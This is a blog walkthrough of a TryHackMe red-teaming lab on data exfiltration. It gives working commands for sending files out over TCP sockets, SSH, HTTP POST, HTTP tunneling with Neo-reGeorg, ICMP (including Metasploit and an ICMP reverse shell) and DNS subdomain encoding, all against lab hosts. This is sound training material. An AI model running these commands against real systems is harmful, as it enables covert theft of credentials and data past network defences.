---
title: Data Exfiltration
date: 2023-10-20
categories: [Red Teaming]
tags: [data-exfiltration, red-teaming, ssh, http, http-tunneling, icmp, dns, dns-tunneling, neoreg, metasploit, hex, ping, tcpdump, icmpdoor, wireshark]
img_path: /assets/red-teaming/data-exfiltration
mermaid: true
---
![Data Exfiltration Banner](data-exfiltration-room-banner.png)

> This is content from THM's [Data Exfiltration](https://tryhackme.com/room/dataxexfilt) room, part of the **Red Teaming** learning path.

## 1. What is Data Exfiltration?

**Data Exfiltration (DE)** is a technique used to transfer data from the target's machine to the attacker's machine. The goal is to **mimic normal network activities** in order to hide the transfer and bypass security measures.

This process is part of the last step on the [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html): *Action on Objectives*.

![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="70%"}

## 2. Network Infrastructure

This room has the following network infrastructure available:

![Network Infrastructure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)

It consists of two separate networks with multiple clients as well as a Jumpbox machine with access to both networks. There is also a domain name, `thm.com`, which can be used for easier communication within the network. Below is the network information:

|  **Domain Name** | **IP Address** | **Network Access** |
|:----------------:|:--------------:|:------------------:|
| jump.thm.com     | 192.168.0.133  | Net 1 and Net 2    |
| uploader.thm.com | 172.20.0.100   | Net 1              |
| flag.thm.com     | ***.**.*.***   | Net 1              |
| victim2.thm.com  | 172.20.0.101   | Net 1              |
| web.thm.com      | 192.168.0.100  | Net 2              |
| icmp.thm.com     | 192.168.0.121  | Net 2              |
| victim1.thm.com  | 192.168.0.101  | Net 2              |

It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 

The room also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.

## 3. TCP Socket Data Exfiltration

This method is **easy to detect** as it relies on non-standard protocols, so it is only used when the attacker knows that they are no network-based security products. 

1. Let's start by sending some data over TCP. Open a listener on the Jumpbox machine, and store any received data on `/tmp/` as `task4-creds.data`:

    ```shell
    # connect to Jumpbox via SSH
    ssh thm@10.10.82.111
    # password: tryhackme

    # open a netcat listener on port 8080
    nc -lvp 8080 > /tmp/task4-creds.data
    ```

2. Connect to the target that has the data we want to transmit, `victim1`:

    ```shell
    # on a new terminal tab connect to Jumpbox again
    ssh thm@10.10.82.111
    # password: tryhackme

    # connect via Jumpbox to victim1 via the domain
    ssh thm@victim1.thm.com
    # or via its ip and port
    ssh thm@10.10.82.98 -p 2022
    # password: tryhackme

    # the data need to be transmitted
    cat task4/creds.txt
    ```

    ![Connect to victim1 from Jumpbox](ssh-from-jb-to-victim1.png)

3. Now, we will use the **TCP Socket exfiltration** method. We will also use **data encoding**, a reversible form of data representation, and **archiving**, so it is hard for someone to examine the data during the trasmission, as it will be in a non-human readable format.

    ```shell
    tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
    ```
    
    Let's break down this command step by step:

    1. `tar zcf - task4/` This command creates a *compressed tarball* (archive) of the `task4` directory and sends the output to the standard output (indicated by `-`) using the `tar` utility. Here's what each option does:
        - `z` Compress the archive using gzip.
        - `c` Create a new archive.
        - `f` Specify the archive file.
        - `-` Send the output to stdout (standard output) instead of a file.
        - `task4/` The directory to be archived.

    2. `|` This is a *pipe operator*, which takes the output of the previous command and passes it as input to the next command.
 
    3. `base64` This command encodes the tarball using *Base64 encoding*. Base64 is a method of encoding binary data into a text-based format.

    4. `|` Another pipe operator.

    5. `dd conv=ebcdic` This command is using the `dd` utility to perform low-level data copying and conversion. The `conv=ebcdic` option is used to convert the data from *ASCII* to *EBCDIC* encoding. *EBCDIC* is another character encoding standard, mostly used on older IBM systems.

    6. `> /dev/tcp/192.168.0.133/8080` This part of the command redirects the output to the IP address 192.168.0.133 on port 8080 using a TCP socket.

    Once we pass the above command, a connection will be received from `victim1` along with the required data in the `/tmp/` directory.

    ![Connection and data received](conn-received.png)

4. We have successfully transferred the data in a non-human readable format:

    ![Encoded data](encoded_data.png)

    We now need to decode and unarchive it:

    ```shell
    # move the /tmp/ directory
    cd /tmp/

    # decode the data
    dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar

    # unarchive the data
    tar xf task4-creds.tar
    ```
    
    Let's break down the commands again:

    1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before, that is, decoding the data.
        - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. The `conv=ascii` option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*. The `if=task4-creds.data` option specifies the input file as `task4-creds.data`.

        - `|` This is a pipe operator, which we explained before.

        - `base64 -d` This part of the command uses the `base64` utility to decode the input data. The `-d` option indicates that it's meant for decoding.

        - `> task4-creds.tar` This portion of the command redirects the decoded data to an output file named `task4-creds.tar`. The data, which was originally encoded and then decoded, is saved in this file.

    2. `tar` We are using the `tar` utility again, but this time for extracting the directory.
        - `x` This option stands for "extract", and it is used to extract the contents of an archive.
        - `f` This option specifies that the next argument will be the name of the archive file from which we want to extract the contents. In this case, `task4-creds.tar` is the archive file.


    ![Decoding and unarchiving data](decode-unarchive-data.png)

## 4. SSH Data Exfiltration

To transfer data over SSH, we can either use the Secure Copy Protocol, `scp`, or the SSH client. For this task, we assume that we don't have the `scp` command available. 

We will use the Jumpbox as our exfiltration server, since it has an SSH server enabled. Since we are already on `victim1`'s machine, we will use this as our target to trasmit the `task5/creds.txt` file.

![Files to be trasmitted](task5-creds.png)

We will use the same method as before to archive the data, but this time instead of redictering them through a TCP socket, we will send the standard output via SSH:

```shell
tar zcf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

The above command creates a tarball and sends it over SSH to the Jumpbox SSH server for extraction. SSH clients provide a way to execute a single command without having a full session. Let's break it down step by step:

1. `tar zcf - task5/` We have seen this part of the command before, which compresses and archives the data.

2. `|` We have also seen what the *pipe operator* does.

3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the `ssh` command to establish an SSH connection. Here's what's happening:
    - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server `jump.thm.com` with the username `thm`.
    - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to `/tmp`, and then extracts a tarball from standard input. The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.

![SSH transmission](ssh-transmission.png)

## 5. HTTP Data Exfiltration

### 5.1 HTTP POST Request

Data Exfiltration through HTTP(S) is one of the best methods, as it hard to distinguish between legitimate and malicious HTTP traffic. We will be using the **POST HTTP request**, as with a **GET HTTP request**, all parameters are registered into the log file. POST HTTP requests:
- Are never cached.
- Do not remain in the browser history.
- Cannot be bookmarked.
- Have no restrictions on data length.

Let's login into `web.thm.com` and inspect the Apache log file with 2 HTTP Requests:

```shell
ssh thm@web.thm.com
# password: tryhackme

sudo cat /var/log/apache2/access.log
# 192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
# 192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
```
The first line is a **GET** request which includes a `file` parameter with exfiltrated data. If we decode this data, we will get the 🚩 required for the first question. The second line is a **POST** request to `/example.php`, in which we sent the same `base64` encoded data, but it does not show what data was transmitted. 

We can decode the data needed for the flag as follows:

![First flag](first-flag.jpg)

### 5.2 HTTP Data Exfiltration

The steps to perform HTTP exfiltration are:
1. We need an HTTP webserver with a data handler (a PHP page that handles the POST request sent to the server). In our case, `web.thm.com` and `contact.php`, respectively.
2. We also need a method to send the data; we will send it via `curl`.
3. A way to receive and store the data; `contact.php` will receive the POST request and store it under the `/tmp` directory.
4. Once the data is stored, we will log into the web server and grab it.

As mentioned on step 1, we already have a web server with a data handler available. The PHP code of `contact.php` can be shown below:

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

The above PHP script will handle POST requests via the `file` parameter and store the received data in the `/tmp` directory as `http.bs64`.

1. Now, from the Jumpbox machine, we can connect via SSH to `victim1.thm.com`:

    ```shell
    ssh thm@victim1.thm.com
    # password: tryhackme
    ```

2. Our goal is to transfer the `/home/thm/task6`'s content from `victim1.thm.com` to the `web.thm.com` server:

    ```shell
    curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
    ```

    Let's break down the command:
    1. `curl` This is the command-line utility used to transfer data to or from a server using various supported protocols. In this case, we are using it for an **HTTP POST request**.
    2. `--data "file=$(tar zcf - task6 | base64)"` This part of the command specifies the data to be included in the HTTP POST request. It's using the `--data` option to send data. The data is enclosed in double quotes.
    3. `file=$(tar zcf - task6 | base64)` This is the data being sent in the POST request. It's a combination of several commands which we have used before. In brief, it creates a compressed tarball of the `task6` directory and `base64` encodes it, making it suitable for transmission in a POST request.
        - `$(...)` This is **command substitution**. It allows the output of the enclosed command sequence, in this case, the Base64-encoded tarball, to be used as a string within the `--data` parameter.
    4. `http://web.thm.com/contact.php` This part of the command specifies the URL to which the HTTP POST request will be sent. It's making a POST request to the `contact.php` script on the `web.thm.com` web server.

3. We can use the Jumpbox to log into `web.thm.com` and check if the data are located under `/tmp`:

    ```shell
    ls /tmp
    # http.bs64
    ```

    Although we have managed to transfer the data, if we take a closer look, it is broken base64: the `+` symbol got replaced with spaces.

    ![Broken base64 data](url-encoding.png)

    This happend due to **URL encoding** over HTTP. We can easily fix it using `sed`:

    ```shell
    sudo sed -i 's/ /+/g' /tmp/http.bs64
    ```

    The provided command uses the **stream editor** utility, `sed`, to make in-place replacements in the `/tmp/http.bs64` file:

    1. `sed` This is a stream editor used to perform basic text transformations on an input stream (a file or data provided via a pipe).

    2. `-i` This option indicates that it should edit the file in place.

    3. `'s/ /+/g'` This is the sed command to perform the text transformation. It's written in the form of a **substitution command**. Here's what each part does:
        - `s` This indicates that it's a substitution operation.
        - `/` This character separates the search pattern from the replacement pattern.
        - `/ /` This is the search pattern. It's looking for spaces.
        - `+` This is the replacement pattern. It replaces spaces with plus symbols.
        - `g` This is a flag that specifies that the substitution should be performed globally in the file (i.e., on all occurrences of the search pattern, not just the first one).

    4. `/tmp/http.bs64` This is the path to the file on which sed will operate.

    ![sed command](sed-command.png)

4. Finally, we need to decode the data:

    ```shell
    base64 -d /tmp/http.bs64 | tar xvfz -
    ```
### 5.3 HTTP tunneling

In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter runs locally and provides services only for the internal network.

![Uploader vs. app server](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)

1. Our goal for this section, is to create an **HTTP Tunnel** to pivot into the internal network and communicate with the `flag.thm.com` server. For achieving this, we will be using the [**Neo-reGeorg**](https://github.com/L-codes/Neo-reGeorg) tool. Let's clone it in our local machine:

    ```shell
    git clone https://github.com/L-codes/Neo-reGeorg
    ```

2. Next, we need to generate an encrypted client file and upload it to the target web server:

    ```shell
    python3 neoreg.py generate -k thm
    ```

    The above command generates encrypted tunneling clients, using `thm` as their key, under the `neoreg_servers/` directory. Various file extensions are available, but we will use the `tunnel.php` file for this one.

    ![tunnel client list](neoreg-servers.png)

3. Now, we need to upload our encrypted tunneling client file at the `uploader.thm.com` server, which we can visit via our browser at `http://10.10.19.86/uploader`. To upload the `tunnel.php` we must use "admin" as the key.

    ![Tunnel Upload](tunnel-upload.jpg)

4. Once the file is uploaded, we will point to it using the `neoreg.py` script using our defined key, `thm`, in order to first decrypt the client file, and then connect to it:

    ```shell
    python3 neoreg.py -k thm http://10.10.19.86/uploader/files/tunnel.php
    ```

    We should get a screen that says that a **SOCKS5 server** has started at `127.0.0.1:1080`.

    ![socks5 server](socks-server.jpg)

5. We can now use the tunnel for accessing the `flag.thm.com` server with an IP address of `172.20.0.120:80`. We leave the tunnel terminal tab as it is, and on a new terminal/tab we communicate with the server via `curl`:

![Flag 2](flag2.jpg)

## 6. ICMP Data Exfiltration

### 6.1 ICMP Manual Data Exfiltration

The [**Internet Control Message Protocol (ICMP)**](https://www.geeksforgeeks.org/internet-control-message-protocol-icmp/) is mostly used by network admins to troubleshoot network connectivity issues. ICMP has many types, but we are mostly instereted in the ICMP `ping`, which uses Type 8 (*Echo*) and Type 0 (*Reply*).

![ICMP Echo Request and ICMP Echo Reply](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)

The ICMP packet structure contains an optional variable-length **Data** section, which is used by the host to match the message to the appropiate process. 

![ICMP packet structure](icmp-packet-structure.png)

Our goal is to exploit this **Data** section by including the data we want to exfiltrate. Let's start by understanding how `ping` works.

```shell
# send an echo request with a count of 1
ping 10.10.98.183 -c 1
```

By capturing the above packet in Wireshark, we can see the following information:

![Wireshark Echo Request Capture](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)

The packet's Data section has been filled with random strings, but it can also be filled with user-defined data. In Linux, the `ping` command has the `-p` option available which can help us do that. According to its [man](https://linux.die.net/man/8/ping) page:

>**-p _pattern_**
>
>You may specify up to 16 ''pad'' bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, **-p ff** will cause the sent packet to be filled with all ones.

This option allows the user to **specify 16 bytes of data in hex format** to send through the packet. For example, if we want to exfiltrate the following credentials: `thm:tryhackme`, we would need to first convert the data to hex, and then pass them to the `ping` command via the `-p` option:

```shell
# convert data to hex
echo "thm:tryhackme" | xxd -p
#  74686d3a7472796861636b6d650a

# pass the hexed data to ping via the pattern option
ping 10.10.98.183 -c 1 -p  74686d3a7472796861636b6d650a
```

By capturing the above packet in Wireshark, we can see that we successfully managed to perform manual ICMP data exfiltration!

![Manul ICMP Data Exfiltration - Wireshark capture](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)

### 6.2 ICMP Data Exfiltration with Metasploit

Metasploit has a module called `icmp_exfil` which uses the same technique we just performed. This module waits to receive a trigger value in order to start writing the data to the disk and then for another trigger value in order to stop. These trigger values are called **Beginning of File (BOF)** and **End of File (EOF)**, respectively.

![Metasploit icmp_exfil BOF and EOF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)

1. Let's see how to setup Metasploit's `icmp_exfil` module:

    ```shell
    # launch metasploit
    $ sudo msfconsole

    # use the icmp_exfil module
    msf6 > use auxiliary/server/icmp_exfil

    # define the required options
    msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER_IP
    # BPF_FILTER => icmp and not src ATTACKER_IP
    msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0
    # INTERFACE => tun0

    # run the module
    msf6 auxiliary(server/icmp_exfil) > run
    ```

    The `BPF_FILTER` option is used so it captures only ICMP packets, `set BPF_FILTER icmp`, and ignore any ICMP packets that have the source IP of the attacking machine, `and not src ATTACKER_IP`.

    We also need to select which network interface to listen to. We can see our network interfaces via the `ifconfig` command:

    ![ifconfig](ifconfig.png)

2. This room has prepared the `icmp.thm.com` machine as the victim for this task, so we can log into it via SSH (first connect to Jumpbox, and from Jumpbox connect to `icmp.thm.com`). This machine has the [NPING](https://nmap.org/nping/) tool installed, which is part of the **NMAP** suite.

    Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to "*^BOF*", followed by the filename being sent:

    ```shell
    # send the BOF trigger to the attacking machine
    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "BOFfile.txt" -c 1 
    ```

3. Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we sent the data without converting it to hex first, Metasploit did that for us:

    ```shell
    # send the data we want to exfiltrate to the attacking machine
    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "admin:password" -c 1 
    ```

4. Finally, we need to send the **EOF trigger**, which defaults to "*^EOF*", to let Metasploit know that we have sent all the data we needed:

    ```shell
    # send the EOF trigger to the attacking machine
    thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "EOF" -c 1
    ```

The whole process can be shown below:

![Metasploit Data Exfiltration](metasploit-icmp-transfer.png)

We can check that the data is as it should be:

![Exfiltrated data](loot-file.png)

### 6.3 ICMP Communication

We can also use the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool, an open-source reverse-shell written in Python3 and [scapy](https://scapy.net/), which, again, uses the same concept as we did before, that is, exploiting the Data section of the ICMP packet.

The only difference with what we did before with Metasploit's `icmp_exfil` module, is that instead of sending credentials within the ICMP packet's Data section, this time we will be sending commands that we want to be executed on the target machine.

![ICMPDoor tool](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)

1. While logged into `icmp.thm.com` machine, we first need to execute the `icmpdoor` binary. We also need to pass the interface to communicate over (`icmp-host`'s interface) along with the destination IP address (`jump-box`'s IP address):

    ```shell
    # passing icmp-host's machine interface along with jumpbox's IP
    thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
    ```

2. Next, we need to execute the `icmp-cnc` binary in order to communicate with the victim, `icmp-host`. Once the communication channel over ICMP is established, we are ready to send commands and receive their outputs:

    ```shell
    # passing jumpbox's machine interface along with icmp-host's IP 
    sudo icmp-cnc -i eth1 -d 192.168.0.121
    ```

    ![icmp-flag](icmp-flag.jpg)

To confim that all communications go through ICMP, we can capture the network traffic using `tcpdump`:

![tcpdump](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)

## 7. DNS Data Exfiltration

### 7.1 DNS Configurations

In order to perform DNS Data Exfiltration, we need to **control a domain name** and **set up DNS records**. For this task, a domain name has been already set up for us, `tunnel.com`, and we can add our own DNS records by visiting the web server via our browser: `http://ATTACKER_IP`. 

![DNS Changer Homepage](dns-changer-home.png)

There is also a newly added `attacker` machine within Network 2 with the following details:

|**Domain Name**|**IP Address**|**Network Access**|
|---|---|---|
|attacker.thm.com|172.20.0.200|Network 2|

The goal is for `attacker.thm.com` to access network devices on Network 1 through `jump.thm.com`.

![Network 2 to Network 1 Access](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)

The rooms recommends to use the `jump.thm.com` machine for completing the task, so we will follow its advice. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:

|**DNS Record**|**Type**|**Value**|
|---|---|---|
|attNS.tunnel.com|A|172.20.0.200|
|att.tunnel.com|NS|attNS.tunnel.com|

To verify that everything is there we can test our DNS configuration as follows:

```shell
# connect to jump.thm.com via SSH
ssh thm@MACHINE-IP
# password: tryhackme

# resolve test.thm.com
thm@jump-box:~$ dig +short test.thm.com
# 127.0.0.1

# send an ICMPEcho Request to test.thm.com to verify connectivity
thm@jump-box:~$ ping test.thm.com -c 1
```

![DNS Testing](dns-testing.png)

We can also answer the room's question by resolving `flag.thm.com`:

![DNS Flag1](dns-flag1.png)

### 7.2 DNS Manual Data Exfiltration

DNS's primary purpose it to **resolve domain names to IP addresses** and vice versa. Since DNS is not a transport protocol, **DNS traffic is not regurarly monitored**, and, in addition, most company **firewalls will allow DNS traffic** to pass through. 

Although the above might seem ideal, DNS has also some limitations:
1. The maximum length of the **Fully Qualified Domain Name (FQDN)** is 255 characters.
2. The maximum length of the **subdomain name**, aka label, is 63 characters.

![DNS Limitations](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)

Based on the above, **we can use a limited number of characters to transfer data over the domain name**. If we have a large file, for example, 10 Megabytes, it may need more than 50_000 DNS requests to transfer it, and, as a result, it will generate a lot of noise.

The steps to perform DNS Data Exfiltration are:
1. The attacker registers a domain name. We already have `tunnel.com`. 
2. The attacker sets up the domain name's DNS record points to a server under his control.
3. The attacker sends sensitive data from a target to a domain name under his control, e.g. `passw0rd.tunnel.com`, where `passw0rd` is the data the needs to be exfiltrated.
4. The DNS request is sent through the local DNS server and is forwarded through the internet.
5. The attacker's authoritative DNS receives the DNS request. 
6. The attacker extracts the data from the domain name.

![DNS Data Exfil Process](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)

Let's assume that we have a filed called `creds.txt`, and we want to move it over DNS. We first need to encode its content and attach it as a subdomain by performing the following steps:
1. Get the required data that needs to be exfiltrated.
2. Encode the data.
3. Send the encoded data as a subdomain, keeping in mind the DNS length limitations. If we exceed those limits, the data will be split and more DNS requests will be sent.

![creds.txt example](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)

Our goal for this task if to transfer the content of the `credit.txt` file from `victim2.thm.com` to `attacker.thm.com` using the `att.tunnel.com` nameserver. 

1. We need to make the `attacker` machine ready to receive DNS requests. We will connect to it via SSH (via fist connecting to `jump.thm.com`), and then we will capture the network traffic for any incoming UDP/53 packets using `tcpdump`:

    ```shell
    # connect to attacker via SSH
    thm@jump-box$ ssh thm@attacker.thm.com
    # password: tryhackme

    # capture incoming UDP/53 packets
    sudo tcpdump -i eth0 udp port 53 -v
    # tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
    ```

2. We can now connect to `victim2.thm.com` through SSH (by first connecto to `jump.thm.com`):

    ```shell
    # connect to victim2 via SSH
    thm@jump-box$ ssh thm@victim2.thm.com
    # password: tryhackme
    ```

    As we can see, there is a `task9/credit.txt` file, which we need to encode:

    ```shell
    victim2$ cat task9/credit.txt
    # Name: THM-user
    # Address: 1234 Internet, THM
    # Credit Card: 1234-1234-1234-1234
    # Expire: 05/05/2022
    # Code: 1337

    victim2$ cat task9/credit.txt | base64
    # TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAxMjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
    ```

3. We now need to split the encoded data into one or more DNS requests depending on the output's length and attach it as a subdomain name:

    ```shell
    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
    ```

    After encoding the data in `base64`, we cleaned the string by removing the new line symbol `\n`, and gathered every 18 characters as a group. Finally, we appended the nameserver `att.tunnel.com` in every group.

    Another way of doing this, is by splitting every 18 characters with a dot `.` and add the nameserver after:

    ```shell
    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
    ```

![Encoding and formatting data](dns-splitting-content.png)

4. Next, from `victim2`, we must send the encoded data as a subdomain name:

    ```shell
    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
    ```

    With some adjustments to the single DNS request, we created and added the `dig` command to send it over DNS, and, finally, we passed it to `bash` to be executed.

    ![DNS Data Exfil](dns-data-transfer.png)

5. Once our DNS request is received, we can stop `tcpdump`, clean, and decode the received data:

```shell
thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
# Name: THM-user
# Address: 1234 Internet, THM
# Credit Card: 1234-1234-1234-1234
# Expire: 05/05/2022
# Code: 1337
```

![dns-cleaning-decoding-data](dns-cleaning-decoding-data.png)

